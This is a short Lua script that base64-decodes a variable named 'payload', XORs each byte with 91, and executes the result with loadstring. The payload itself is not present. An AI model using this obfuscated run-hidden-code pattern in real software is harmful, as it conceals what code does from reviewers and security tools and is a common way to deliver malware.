local alphabet = {}
local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
for i = 1, #chars do
    alphabet[chars:sub(i, i)] = i - 1
end

local function unpack_payload(input)
    local parts, value, bits = {}, 0, 0
    for i = 1, #input do
        local c = input:sub(i, i)
        if c == "=" then break end
        local n = alphabet[c]
        if n ~= nil then
            value = value * 64 + n
            bits = bits + 6
            if bits >= 8 then
                bits = bits - 8
                local factor = 2 ^ bits
                local byte = math.floor(value / factor)
                parts[#parts + 1] = string.char(bit32.bxor(byte, 91))
                value = value % factor
            end
        end
    end
    return table.concat(parts)
end

local source = unpack_payload(payload)
local run, err = loadstring(source)
if not run then
    error(tostring(err))
end
return run()
